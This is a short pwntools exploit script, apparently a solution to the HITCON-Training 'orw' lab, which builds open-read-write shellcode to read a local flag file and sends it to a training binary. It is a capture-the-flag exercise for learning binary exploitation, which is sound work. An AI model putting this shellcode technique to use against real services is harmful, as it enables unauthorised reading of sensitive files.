#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from pwn import shellcraft as sc
context.log_level = "debug"

shellcode = sc.pushstr("/home/m4x/HITCON-Training/LAB/lab2/testFlag")
shellcode += sc.open("esp")
#  open返回的文件文件描述符存贮在eax寄存器里 
shellcode += sc.read("eax", "esp", 0x100)
#  open读取的内容放在栈顶 
shellcode += sc.write(1, "esp", 0x100)

io = process("./orw.bin")
io.sendlineafter("shellcode:", asm(shellcode))
print io.recvall()
io.close()
